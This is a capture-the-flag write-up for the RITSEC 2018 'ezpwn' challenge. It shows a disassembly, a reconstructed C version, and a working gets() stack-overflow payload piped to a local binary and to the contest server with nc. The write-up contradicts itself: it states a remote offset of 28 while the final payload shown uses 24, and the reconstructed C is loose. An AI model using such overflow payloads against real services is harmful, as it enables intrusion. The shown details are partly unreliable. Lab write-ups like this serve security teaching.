# ezpwn

## Description

nc fun.ritsec.club 8001

---  
## Initial Start

There is a binary available for download which contains a 64 bit binary file.  
After downloading the program, I have used GDB to disassemble the code.

```  
gdb-peda$ disassemble main  
Dump of assembler code for function main:  
  0x0000000000001195 <+0>:      push   rbp  
  0x0000000000001196 <+1>:      mov    rbp,rsp  
  0x0000000000001199 <+4>:      sub    rsp,0x20  
  0x000000000000119d <+8>:      mov    DWORD PTR [rbp-0x8],0x0  
  0x00000000000011a4 <+15>:     lea    rdi,[rip+0xe59]        # 0x2004  
  0x00000000000011ab <+22>:     call   0x1040 <puts@plt>  
  0x00000000000011b0 <+27>:     lea    rax,[rbp-0x20]  
  0x00000000000011b4 <+31>:     mov    rdi,rax  
  0x00000000000011b7 <+34>:     mov    eax,0x0  
  0x00000000000011bc <+39>:     call   0x1080 <gets@plt>  
  0x00000000000011c1 <+44>:     cmp    DWORD PTR [rbp-0x8],0x1  
  0x00000000000011c5 <+48>:     jne    0x121b <main+134>  
  0x00000000000011c7 <+50>:     lea    rsi,[rip+0xe50]        # 0x201e  
  0x00000000000011ce <+57>:     lea    rdi,[rip+0xe4b]        # 0x2020  
  0x00000000000011d5 <+64>:     call   0x1090 <fopen@plt>  
  0x00000000000011da <+69>:     mov    QWORD PTR [rbp-0x10],rax  
  0x00000000000011de <+73>:     mov    rax,QWORD PTR [rbp-0x10]  
  0x00000000000011e2 <+77>:     mov    rdi,rax  
  0x00000000000011e5 <+80>:     call   0x1070 <fgetc@plt>  
  0x00000000000011ea <+85>:     mov    BYTE PTR [rbp-0x1],al  
  0x00000000000011ed <+88>:     jmp    0x1209 <main+116>  
  0x00000000000011ef <+90>:     movsx  eax,BYTE PTR [rbp-0x1]  
  0x00000000000011f3 <+94>:     mov    edi,eax  
  0x00000000000011f5 <+96>:     call   0x1030 <putchar@plt>  
  0x00000000000011fa <+101>:    mov    rax,QWORD PTR [rbp-0x10]  
  0x00000000000011fe <+105>:    mov    rdi,rax  
  0x0000000000001201 <+108>:    call   0x1070 <fgetc@plt>  
  0x0000000000001206 <+113>:    mov    BYTE PTR [rbp-0x1],al  
  0x0000000000001209 <+116>:    cmp    BYTE PTR [rbp-0x1],0xff  
  0x000000000000120d <+120>:    jne    0x11ef <main+90>  
  0x000000000000120f <+122>:    mov    rax,QWORD PTR [rbp-0x10]  
  0x0000000000001213 <+126>:    mov    rdi,rax  
  0x0000000000001216 <+129>:    call   0x1050 <fclose@plt>  
  0x000000000000121b <+134>:    mov    eax,DWORD PTR [rbp-0x8]  
  0x000000000000121e <+137>:    mov    esi,eax  
  0x0000000000001220 <+139>:    lea    rdi,[rip+0xe02]        # 0x2029  
  0x0000000000001227 <+146>:    mov    eax,0x0  
  0x000000000000122c <+151>:    call   0x1060 <printf@plt>  
  0x0000000000001231 <+156>:    mov    eax,0x0  
  0x0000000000001236 <+161>:    leave  
  0x0000000000001237 <+162>:    ret  
End of assembler dump.

```

This is a fairly simple program. Since this is a short program, I will take
this time to practice on reversing back to C code.

```  
int main(){

   int x = 0;  
   char buffer;  
   FILE *f;

   puts("Please enter your API key");  
   gets(&buffer);  
   f = fopen("flag.txt","r");  
   if(x==1){  
       while(y != -1){  
           y=fgetc(f); // Acts like the decrement  
           putchar(y);  
           fclose(f);  
       }  
   }  
   printf("%d\n",x);  
}  
```  
To test it out, we need to create a dummy flag.txt file

```  
echo "Flag: flag{1234}" > flag.txt  
```

Here, gets was used which pays no attention to how much input can be put. So
trying a few random payload on the server, we get this.  
```  
root@kali:~/Desktop/ritsec2018/pwn# nc fun.ritsec.club 8001  
Please enter your API key  
asd  
0

root@kali:~/Desktop/ritsec2018/pwn#  nc fun.ritsec.club 8001  
Please enter your API key  
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII  
1212696648  
```  
We can see that after a certain length, we see numbers. The reason these
numbers can be seen is because we have overwritten into the stack and ended up
overwriting the variable x which will be printed out as in the pseudocode
after tje flag is being printed out with putchar function

---  
## Locally  
Checking from GDB,

```  
# This is where x = 0  
0x000000000000119d <+8>:        mov    DWORD PTR [rbp-0x8],0x0

# This is where we store the input buffer into using the gets function  
0x00000000000011b0 <+27>:       lea    rax,[rbp-0x20]  
0x00000000000011b4 <+31>:       mov    rdi,rax  
0x00000000000011b7 <+34>:       mov    eax,0x0  
0x00000000000011bc <+39>:       call   0x1080 <gets@plt>  
```  
As we can see, the two addresses are `rbp-0x8` and `rbp-0x20`  
of which the difference is

```  
>>> 0x20-0x8  
24  
```

So we can now generate a payload and test it out.

```  
python -c "print 'A'*24 + 'BBBB' " | ./ezpwn  
```  
and we can see  
```  
root@kali:~/Desktop/ritsec2018/pwn# python -c "print 'A'*24 +'BBBB'" | ./ezpwn  
Please enter your API key  
1111638594  
```

Here 1111638594 = 0x42424242 which means that now we only need to change this
value to 1.

So following the little Endian Format, we can generate a payload

```  
root@kali:~/Desktop/ritsec2018/pwn# python -c "print 'A'*24 + '\x01\x00\x00\x00'" | ./ezpwn  
Please enter your API key  
Flag: flag{1234}  
1  
```

---

## Remotely  
The same was being tested but for some reason, I kept getting a 0 and it turns
out after trying the same technique with fixed sequence, the number of buffer
to overwrite is a little different. Instead of 24, it is 28

```  
>>> hex(1212696648)  
'0x48484848'  
>>> chr(0x48)  
'H'  
>>> len("AAAABBBBCCCCDDDDEEEEFFFFGGGG")  
28  
```

Thus The payload is

```  
root@kali:~/Desktop/ritsec2018/pwn# python -c "print 'a'*24 +
'\x01\x00\x00\x00'"| nc fun.ritsec.club 8001  
Please enter your API key  
RITSEC{Woah_Dud3_it's_really_that_easy?_am_i_leet_yet?}1  
root@kali:~/Desktop/ritsec2018/pwn#  
```

Flag: RITSEC{Woah_Dud3_it's_really_that_easy?_am_i_leet_yet?}  
---  
---